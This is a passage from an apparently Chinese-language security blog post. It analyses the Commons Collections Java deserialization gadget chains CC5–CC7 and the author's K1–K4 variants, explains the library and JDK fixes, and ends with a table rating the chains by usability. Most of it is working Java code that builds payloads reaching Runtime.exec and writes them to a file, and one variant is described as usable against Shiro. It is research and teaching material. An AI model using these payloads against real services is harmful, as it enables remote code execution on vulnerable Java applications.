class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">i</span> <span class="operator">=</span> constantTransformer.getClass().getDeclaredField(<span class="string">&quot;iConstant&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(constantTransformer, TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">i = initTransformer.getClass().getDeclaredField(<span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(initTransformer, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line"></span><br><span class="line">i = initTransformer.getClass().getDeclaredField(<span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(initTransformer, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tpl&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// then write queue</span></span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h1><h2 id="依赖-5"><a href="#依赖-5" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>Java &gt;&#x3D; 8u76</li>
<li>SecurityManager 未开启</li>
</ul>
<h2 id="利用链-5"><a href="#利用链-5" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    TiedMapEntry.toString()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                ConstantTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Class.getMethod()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.getRuntime()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>这个 gadget 只能在 8u76 之后用，原因在于 8u76 为 BadAttributeValueExpException 添加了 readObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时 TiedMap 的 <code>toString</code> 方法为，可以说是非常人性化了:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LazyMap 和 1 的是一样的</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chain);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">i</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(obj, <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(m, <span class="string">&quot;value&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// then write obj</span></span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><h2 id="依赖-6"><a href="#依赖-6" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
</ul>
<h2 id="利用链-6"><a href="#利用链-6" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.HashMap.readObject()</span><br><span class="line">    java.util.HashMap.hash()</span><br><span class="line">        TiedMapEntry.hashCode()</span><br><span class="line">        	TiedMapEntry.getValue()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>由于 5 有环境版本的要求，这个相当于是 5 的改进，不依赖版本了。利用链原理 <code>TiedMapEntry</code> 的 <code>hashcode</code> 方法可以结合 <code>HashMap</code> 利用:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial 中这个 gadget 实现的很复杂，实际上可以简化 <a href="https://xz.aliyun.com/t/7157">参考</a>，完整链手写如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open /Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, execArgs),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;())&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">inertChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">HashMap&lt;String,String&gt; innerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> LazyMap.decorate(innerMap, inertChain);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tied</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(m, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">outerMap.put(tied, <span class="string">&quot;t&quot;</span>);</span><br><span class="line"><span class="comment">// 这个很关键</span></span><br><span class="line">innerMap.clear();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将真正的 transformers 设置, 避免上面 put 时 payload 时就执行了</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> inertChain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(inertChain, transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">out.writeObject(outerMap);</span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure>

<p>这里有个细节很关键，就是 <code>innerMap.clear()</code> 这句，这并不是为了清空下缓存，而是如果没有这一句在反序列化时就不会触发了，原因是 LazyMap 中有这样的写法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有 clear，那么反序列化后的 map 是直接包含了 key 的，这里的 factory.transform 就中断了。为了方便使用，我把这条简化后的链命名为了 K3，见后面的部分。</p>
<h1 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h1><h2 id="依赖-7"><a href="#依赖-7" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
</ul>
<h2 id="利用链-7"><a href="#利用链-7" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">  java.util.Hashtable.reconstitutionPut</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">      LazyMap.get()</span><br><span class="line">          ChainedTransformer.transform()</span><br><span class="line">              ConstantTransformer.transform()</span><br><span class="line">              InvokerTransformer.transform()</span><br><span class="line">                  Method.invoke()</span><br><span class="line">                      Class.getMethod()</span><br><span class="line">              InvokerTransformer.transform()</span><br><span class="line">                  Method.invoke()</span><br><span class="line">                      Runtime.getRuntime()</span><br><span class="line">              InvokerTransformer.transform()</span><br><span class="line">                  Method.invoke()</span><br><span class="line">                      Runtime.exec()</span><br></pre></td></tr></table></figure>

<h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>这个原理基于三个小技巧:</p>
<ol>
<li>yy 和 zZ 这两个字符串的 hashcode() 是一样的</li>
<li>当向 hashtable 或 hashmap 中put时，如果 key 是一个 map，hashcode 的计算方法是这种方式:</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// java.util.AbstractMap#hashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">    <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">        h += i.next().hashCode();</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>当 key 为 map 类型并且发生了 hashcode 碰撞，会做深层次的比较:</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// java.util.AbstractMap#equals</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 这里会触发 lazymap 的 transform</span></span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, inertChain);</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, inertChain);</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">i</span> <span class="operator">=</span> inertChain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">i.setAccessible(<span class="literal">true</span>);</span><br><span class="line">i.set(inertChain, transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和 6 中 innerMap.clear() 一个道理，需要清除 put 时的缓存，这样反序列化时才会产生冲突并触发 lazymap.get</span></span><br><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"><span class="comment">// then write hashtable to file</span></span><br></pre></td></tr></table></figure>

<h1 id="CommonsCollectionsK1-K2"><a href="#CommonsCollectionsK1-K2" class="headerlink" title="CommonsCollectionsK1,K2"></a>CommonsCollectionsK1,K2</h1><h2 id="依赖-8"><a href="#依赖-8" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>K1: CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>K2: CommonsCollections &#x3D;&#x3D; 4.0</li>
</ul>
<h2 id="利用链-8"><a href="#利用链-8" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap.readObject</span><br><span class="line">    TiedMapEntry.hashCode</span><br><span class="line">     TiedMapEntry.getValue</span><br><span class="line">       LazyMap.decorate</span><br><span class="line">         InvokerTransformer</span><br><span class="line">           templates...</span><br></pre></td></tr></table></figure>

<h2 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h2><p>这是我在做 shiro 检测时被迫组合出的一条利用链，这条链虽然是新瓶装旧酒——前半段类似 6，后半段类似 2，但完全避免了 <code>ChainedTransformer</code> 的使用且仅依赖于 CommonsCollections，最终效果是可以直接在 shiro 1.2.24 的环境中使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">tpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">HashMap&lt;String,String&gt; innerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">m</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tied</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(m, tpl);</span><br><span class="line">outerMap.put(tied, <span class="string">&quot;t&quot;</span>);</span><br><span class="line"><span class="comment">// 这个很关键</span></span><br><span class="line">innerMap.clear();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将真正的 transformers 设置, 避免上面 put 时 payload 时就执行了</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(transformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">out.writeObject(outerMap);</span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure>

<p>K2 与 K1 的差别，仅仅是将 lazyMap 改为了 4.0 中的写法，不再赘述。</p>
<h1 id="CommonsCollectionsK3-K4"><a href="#CommonsCollectionsK3-K4" class="headerlink" title="CommonsCollectionsK3,K4"></a>CommonsCollectionsK3,K4</h1><h2 id="依赖-9"><a href="#依赖-9" class="headerlink" title="依赖"></a>依赖</h2><ul>
<li>K1: CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>K2: CommonsCollections &#x3D;&#x3D; 4.0</li>
</ul>
<h2 id="利用链-9"><a href="#利用链-9" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.util.HashMap.readObject()</span><br><span class="line">    java.util.HashMap.hash()</span><br><span class="line">        TiedMapEntry.hashCode()</span><br><span class="line">            TiedMapEntry.getValue()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h2><p>K3 这个链其实就是我上面写的 6，ysoserial 中的写法有些啰嗦，所以单独抽出来重新命名了一下。K4 就是 K3 的 4.0 适配版，不再赘述。</p>
<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><h2 id="3-2-1"><a href="#3-2-1" class="headerlink" title="3.2.1"></a>3.2.1</h2><p>在 3.2.2 中对几个高危反序列化点都加了检查</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream is)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);</span><br><span class="line">    is.defaultReadObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FunctorUtils.checkUnsafeSerialization</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkUnsafeSerialization</span><span class="params">(Class clazz)</span> &#123;</span><br><span class="line">    String unsafeSerializableProperty;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        unsafeSerializableProperty = </span><br><span class="line">            (String) AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> System.getProperty(UNSAFE_SERIALIZABLE_PROPERTY);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SecurityException ex) &#123;</span><br><span class="line">        unsafeSerializableProperty = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;true&quot;</span>.equalsIgnoreCase(unsafeSerializableProperty)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(</span><br><span class="line">                <span class="string">&quot;Serialization support for &quot;</span> + clazz.getName() + <span class="string">&quot; is disabled for security reasons. &quot;</span> +</span><br><span class="line">                <span class="string">&quot;To enable it set system property &#x27;&quot;</span> + UNSAFE_SERIALIZABLE_PROPERTY + <span class="string">&quot;&#x27; to &#x27;true&#x27;, &quot;</span> +</span><br><span class="line">                <span class="string">&quot;but you must ensure that your application does not de-serialize objects from untrusted sources.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有使用黑名单策略，如果配置里没有启用，反序列化功能就会被完全禁用掉。</p>
<h2 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h2><p>直接把一些敏感类的 Serializable 接口去掉了..</p>
<ul>
<li><em><em><strong>WARNING</strong>: from v4.1 onwards this class will not be serializable anymore</em> in order to prevent potential remote code execution exploits. Please refer to</em> <font color="blue">COLLECTIONS-580 </font></li>
</ul>
<ul>
<li>for more details.*</li>
</ul>
<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>除了对 CommonsCollections 本身的修复，JDK 对 AnnotationInvocationHandler 这个非常好用的类也做了些防护，在 8u71 中, 对 readObject 做了一些修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sun.reflect.annotation.AnnotationInvocationHandler#readObject</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">GetField</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readFields();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">var4</span> <span class="operator">=</span> (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var6</span> <span class="operator">=</span> var5.memberTypes();</span><br><span class="line">    <span class="type">LinkedHashMap</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var8</span> <span class="operator">=</span> var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        <span class="type">Entry</span> <span class="variable">var9</span> <span class="operator">=</span> (Entry)var8.next();</span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var12</span> <span class="operator">=</span> (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="literal">null</span>) &#123;</span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var11.getClass() + <span class="string">&quot;[&quot;</span> + var11 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="built_in">this</span>, var3);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到最终反序列化出的 <code>memberValues</code> 已经不是我们原始的 <code>lazyMap</code> 了，而是一个新的 <code>LinkedHashMap</code>，这样所有 <code>AnnotationInvocationHandler</code> 搭配 lazymap 的利用链全都失效了。这也是我不太喜欢这些利用链的原因，它们不仅有库的依赖，还有环境的依赖。那么哪些是高价值利用链，哪些是没有环境依赖就能打的，我们来总结一下。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="left">利用链</th>
<th align="center">依赖</th>
<th align="center">推荐程度</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CC1</td>
<td align="left">AnnotationInvocationHandler<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
<td align="center">CC &lt;&#x3D; 3.2.1<br />Java &lt; 8u71</td>
<td align="center">低</td>
<td align="center">可改造以支持 4.0</td>
</tr>
<tr>
<td align="center">CC2</td>
<td align="left">PriorityQueue<br />TransformingComparator<br />InvokerTransformer<br />TemplatesImpl</td>
<td align="center">CC4.0</td>
<td align="center">中</td>
<td align="center"></td>
</tr>
